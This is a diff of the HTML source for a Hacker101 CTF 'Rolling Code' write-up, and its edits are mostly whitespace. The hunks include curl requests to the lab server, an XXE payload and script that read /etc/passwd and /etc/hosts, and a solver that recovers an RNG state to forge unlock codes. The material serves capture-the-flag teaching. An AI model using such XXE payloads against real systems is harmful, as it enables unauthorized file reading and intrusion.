@@ -139,7 +139,7 @@ unlock                  [Status: <span class=code-dark-yellow>405</span>, Size: 
 <p>The source code for this page contains useful information:</p>
 <p><img src=/images/Hacker101CTF/Rolling-Code-4.png alt="Admin site source code"></p>
 <p>If we go to <code>/get-config</code>, we will see an XML document:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/get-config 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/get-config
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;Front door&lt;/location&gt;&lt;/config&gt;  
 </code></pre></div>
 <p>The output is in XML, so this might be vulnerable to XML External Entity (XXE) injection. If there is a <code>/get-config</code>, it is likely that there is also a <code>/set-config</code> route:</p>
@@ -150,7 +150,7 @@ unlock                  [Status: <span class=code-dark-yellow>405</span>, Size: 
 &lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;  
 </code></pre></div>
 <p>We obtain a 400 Bad Request, so probably we need to add some query parameters (for GET) or request body (using POST):</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?location=asdf'</span>  
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?location=asdf'</span>
 &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
 &lt;title&gt;400 Bad Request&lt;/title&gt;
 &lt;h1&gt;Bad Request&lt;/h1&gt;
@@ -198,12 +198,12 @@ data                    [Status: <span class=code-dark-red>500</span>, Size: 291
 </code></pre></div>
 <p>And the value inside <code>/admin</code> has changed. Now, we can enter another XML document to read files using an XML External Entity like this:</p>
 <div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;</span>
-<span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[ &lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt; ]</span><span class=mtk1>&gt;</span>
+<span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[ &lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt; ]</span><span class=mtk1>&gt;</span>  
 <span class=mtk1>&lt;</span><span class=mtk5>config</span><span class=mtk1>&gt;</span>
   <span class=mtk1>&lt;</span><span class=mtk5>location</span><span class=mtk1>&gt;</span><span class=mtk6>&amp;xxe;</span><span class=mtk1>&lt;/</span><span class=mtk5>location</span><span class=mtk1>&gt;</span>
 <span class=mtk1>&lt;/</span><span class=mtk5>config</span><span class=mtk1>&gt;</span>
 </code></pre></div>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode <span class=code-dark-yellow>'data=&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;config&gt;&lt;location&gt;&xxe;&lt;/location&gt;&lt;/config&gt;'</span>  
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode <span class=code-dark-yellow>'data=&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;config&gt;&lt;location&gt;&amp;xxe;&lt;/location&gt;&lt;/config&gt;'</span>  
 &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
 &lt;title&gt;Redirecting...&lt;/title&gt;
 &lt;h1&gt;Redirecting...&lt;/h1&gt;
@@ -275,7 +275,7 @@ nobody:x:65534:65534:nobody:/:/sbin/nologin
 <span class=mtk7>echo</span> <span class=mtk1>-n</span> <span class=mtk4>"</span><span class=mtk1>$res</span><span class=mtk4>"</span> <span class=mtk5>|</span> <span class=mtk1>sed</span> <span class=mtk1>-n</span> <span class=mtk4>"</span><span class=mtk1>${begin}</span><span class=mtk4>,</span><span class=mtk1>${end}</span><span class=mtk4>p"</span>
 </code></pre></div>
 <p>Now with this Bash script we can read files from the server specifying the absolute path:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> xxe.sh http://35.190.155.168/c33a5d03b6 /etc/hosts 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> xxe.sh http://35.190.155.168/c33a5d03b6 /etc/hosts  
 127.0.0.1  localhost
 ::1  localhost ip6-localhost ip6-loopback
 fe00::0  ip6-localnet
@@ -286,10 +286,10 @@ ff02::2  ip6-allrouters
 </code></pre></div>
 <p>Although we know the server has nginx configured, we cannot show configuration files such as <code>/etc/nginx/nginx.conf</code> or <code>/etc/nginx/sites-enabled/default</code>.</p>
 <p>However, we can guess that the server is running Flask (a Python web framework) because the HTTP response status messages are in capital letters:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/doesnotexist -I
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/doesnotexist -I  
 HTTP/1.1 404 NOT FOUND
 <span class=code-white>Server</span>: nginx/1.14.0 (Ubuntu)
-<span class=code-white>Date</span>: 
+<span class=code-white>Date</span>:
 <span class=code-white>Content-Type</span>: text/html
 <span class=code-white>Content-Length</span>: 233
 <span class=code-white>Connection</span>: keep-alive
@@ -391,7 +391,7 @@ HTTP/1.1 404 NOT FOUND
         <span class=mtk5>return</span> <span class=mtk4>'Code</span> <span class=mtk4>incorrect.</span>  <span class=mtk4>Expected</span> <span class=mtk6>%08i</span><span class=mtk4>'</span> <span class=mtk5>%</span> <span class=mtk1>cur</span>
 </code></pre></div>
 <p>The function called <code>next</code> is not the built-in one. In fact it is taken from <code>rng</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>from</span> <span class=mtk1>rng</span> <span class=mtk5>import *</span>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>from</span> <span class=mtk1>rng</span> <span class=mtk5>import *</span>  
 </code></pre></div>
 <p>So there must be a file called <code>rng.py</code>, which is this one:</p>
 <div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">random</span>
@@ -430,7 +430,7 @@ HTTP/1.1 404 NOT FOUND
     <span class=mtk5>return</span> <span class=mtk1>ret</span>
 
 
-<span class=mtk8>setup</span><span class=mtk1>((</span><span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>16</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>))</span>  
+<span class=mtk8>setup</span><span class=mtk1>((</span><span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>16</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>))</span>
 </code></pre></div>
 <p>This file is used to generate the rolling codes. We must obtain the next code provided one or more previous codes, or at least extract the initial seed in order to be able to generate valid rolling codes for the lock.</p>
 <p>The script is using three important variables:</p>
@@ -446,9 +446,9 @@ HTTP/1.1 404 NOT FOUND
 
 <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
     <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
-    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>
+    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>  
 
-    <span class=mtk3># Changes in state</span>  
+    <span class=mtk3># Changes in state</span>
 </code></pre></div>
 <ul>
 <li><code>state</code>: It is initially generated by the <code>seed</code> as:</li>
@@ -458,12 +458,12 @@ HTTP/1.1 404 NOT FOUND
 <span class=mtk5>for</span> <span class="mtk1 squiggly-inline-unnecessary">i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
     <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class="mtk9 mtki">seed</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span>
     <span class="mtk9 mtki">seed</span> <span class=mtk5>&gt;&gt;=</span> <span class=mtk6>2</span>
-    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>4</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>cur</span><span class=mtk1>)</span>
+    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>4</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>cur</span><span class=mtk1>)</span>  
     <span class=mtk1>state</span> <span class=mtk5>|=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span>
 </code></pre></div>
 <p>But this is not useful since the <code>seed</code> is random. We see that the <code>state</code> changes on each execution of <code>next</code>, and actually, on each of the 26 iterations within a single call to <code>next</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
-    <span class=mtk3># Changes in ret</span> 
+    <span class=mtk3># Changes in ret</span>
 
     <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>61</span><span class=mtk1>)</span>
     <span class=mtk1>state</span> <span class=mtk5>&amp;=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>
@@ -714,9 +714,9 @@ $$</p>
 
 <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
     <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
-    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>
+    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>  
 
-    <span class=mtk3># Changes in state</span>  
+    <span class=mtk3># Changes in state</span>
 </code></pre></div>
 <p>It is formed by the least significant bit of <code>state</code> in each iteration. So, we need the last row of matrices $I, A, A^2, A^3, \dots, A^{24}, A^{25}$, which are related to the last bit of the current <code>state</code> on each iteration.</p>
 <p>The idea is to solve a system of equations so that we can get the current <code>state</code>. With one rolling code, we have 26 equations (as the code is a 26-bit number). Although the <code>state</code> is 64 bits long, we have shown that every four bits, there are two that have the same value (this fact leads to 16 equations). Hence, we have 48 unknowns. Then, to solve for a complete <code>state</code>, we will need at least two rolling codes. We will need to concatenate the two rolling codes and compute the last row for matrices $A^0$ through $A^{47}$.</p>
@@ -755,7 +755,7 @@ $$</p>
         <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
             <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
                 <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk1>a</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>a</span><span class=mtk1>,</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class="mtk8 mtku">zip</span><span class=mtk1>(</span><span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>],</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>])]</span>
-    
+
     <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)</span> <span class=mtk5>-</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>):</span>
         <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>-</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>):</span>
             <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
@@ -809,9 +809,9 @@ $$</p>
 <span class=mtk1>ret_mat</span> <span class=mtk5>=</span> <span class=mtk1>[]</span>
 
 <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
-    <span class=mtk1>ret_mat</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{9</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>(</span><span class=mtk6>4</span> <span class=mtk5>*</span> <span class=mtk1>i</span><span class=mtk1>)</span><span class="mtk7 mtki">:064b</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>))))</span>
+    <span class=mtk1>ret_mat</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{9</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>(</span><span class=mtk6>4</span> <span class=mtk5>*</span> <span class=mtk1>i</span><span class=mtk1>)</span><span class="mtk7 mtki">:064b</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>))))</span>  
 
-<span class=mtk1>state_mat</span> <span class=mtk5>=</span> <span class=mtk1>[[</span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>i</span> <span class=mtk5>==</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span> <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span>  
+<span class=mtk1>state_mat</span> <span class=mtk5>=</span> <span class=mtk1>[[</span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>i</span> <span class=mtk5>==</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span> <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span>
 
 <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>48</span><span class=mtk1>):</span>
     <span class=mtk1>ret_mat</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class=mtk1>state_mat</span><span class=mtk1>[</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>])</span>
@@ -852,7 +852,7 @@ $$</p>
     <span class=mtk5>return</span> <span class=mtk1>z_mat</span>
 </code></pre></div>
 <p>Finally, if we run the script, we get the second flag:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py http://35.190.155.168/c33a5d03b6  
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py http://35.190.155.168/c33a5d03b6
 Unlocked successfully.  Flag: ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  
 </code></pre></div>
 <div class="mt6 instapaper_ignoref">
